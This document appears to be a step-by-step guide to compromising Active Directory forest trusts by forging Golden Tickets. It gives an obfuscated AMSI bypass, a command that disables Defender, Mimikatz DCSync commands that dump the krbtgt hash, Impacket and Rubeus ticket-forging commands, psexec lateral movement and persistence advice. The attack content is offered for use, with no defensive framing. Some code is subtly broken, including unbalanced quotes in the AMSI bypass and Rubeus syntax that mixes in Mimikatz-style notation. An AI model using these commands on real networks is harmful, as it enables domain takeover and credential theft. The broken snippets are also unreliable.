
Attacking **Active Directory Forest Trusts** and obtaining a **Golden Ticket** involves leveraging domain privileges to forge a **TGT (Ticket Granting Ticket)**, granting nearly unrestricted access within the trusted domains. Here's a step-by-step overview:

### Assumptions
- You have shell access on a **Domain Controller** (DC) in one domain.
- You need to bypass **AMSI** and **Defender** if necessary.
- You are aiming to compromise an **Active Directory Forest Trust** by forging a **Golden Ticket**.

### Step 1: Bypass AMSI and Defender
If **AMSI** and **Windows Defender** are enabled, you’ll need to bypass them before launching any offensive tooling. Common methods include:
  
#### AMSI Bypass
You can use PowerShell to bypass AMSI. Here's an AMSI bypass that disables its scanning.

```powershell
sET-ItEM ( 'V' + 'aR' + 'IA' + 'blE:1q2w3e4r5t' ).ValuE=([Ref].AsSembLY.GeTtyPe('Sys'+'tem.Man'+'agement.Autom'+'ation.A'+'m'S'+'iUt'+'Ils').GeTmEtHod('G'+'et_'+ 'Am'+'si'C'+'o'N'T'exT', ([type[]]@()))).invoke($null,$null);sET-ITEm ( 'V'+'aRIaBlE:1q2w3e4r5t' ).ValUE.Set_FiEld('a'+'m'+'si'+'In'+'i'T_F'+'LAG',0)
```

This code disables AMSI by reflecting its internal methods and setting its internal flag to 0.

#### Disable Defender (PowerShell)
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

You can temporarily disable **Windows Defender** real-time monitoring with the above PowerShell command.

### Step 2: Elevating Privileges to Dump Domain Admin Credentials
- If you have domain admin or a highly privileged account, you can dump the **krbtgt** hash from the target domain. This is needed to forge a **Golden Ticket**.
  
- Use **Mimikatz** (or similar tools like **Rubeus**) to dump the **krbtgt** hash from the DC. Assuming you already have a tool like **Sliver** or **Impacket** in place:

```powershell
mimikatz.exe
privilege::debug
lsadump::dcsync /user:krbtgt /domain:yourdomain.com
```

This will dump the **krbtgt** hash. Keep both the **NTLM** and **AES** hashes.

### Step 3: Trust Enumeration (Optional)
If the forest trust is in place, enumerate trusted domains using **BloodHound** or **PowerView** to confirm that the **krbtgt** hash applies across domains.

### Step 4: Create a Golden Ticket (Impacket)
Once you have the **krbtgt** hash, you can forge a **Golden Ticket** to impersonate any user in the domain.

#### Using Impacket `ticketer.py`
```bash
python3 ticketer.py -nthash <krbtgt_NTLM_hash> -domain-sid <SID> -domain <domain> <username>
```
- `<krbtgt_NTLM_hash>`: This is the NTLM hash of the **krbtgt** user you extracted.
- `<SID>`: This is the **Security Identifier** of the domain, which you can get from **BloodHound** or through enumeration.
- `<username>`: Specify the username you want to impersonate (e.g., Administrator).

Once the ticket is generated, you can inject it into your session.

#### Using Rubeus
Alternatively, use **Rubeus** to import and use the Golden Ticket:
```powershell
Rubeus.exe tgt::golden /domain:<domain> /sid:<sid> /user:<username> /rc4:<krbtgt_hash> /id:<RID> /target:<trusteddomain.com>
```

### Step 5: Lateral Movement
Now that you have a **Golden Ticket**, you can authenticate to the other domain in the forest trust.

- Use **psexec.py** from **Impacket** to execute commands on the trusted domain's DC or other servers:
  ```bash
  python3 psexec.py <target_domain>/<admin_user>@<target_dc> -k -no-pass
  ```

This gives you command execution rights on the trusted DC.

### Step 6: Perform Forest-Wide DCSync (If Required)
You can now perform a **DCSync** attack on the target domain to dump credentials from the trusted domain.

```powershell
mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:trusted_domain.com
```

### Step 7: Maintain Persistence
Once you have credentials or hashes for trusted domains, you can pivot, forge **Golden Tickets**, or create **Silver Tickets** for persistence in the entire forest.

### Tools Involved:
1. **Impacket** (`ticketer.py`, `psexec.py`).
2. **Sliver**: Can serve as your payload delivery method if you're using shell access.
3. **Mimikatz** or **Rubeus**: For dumping and abusing credentials.
4. **BloodHound**: To understand trust relationships and delegation paths.

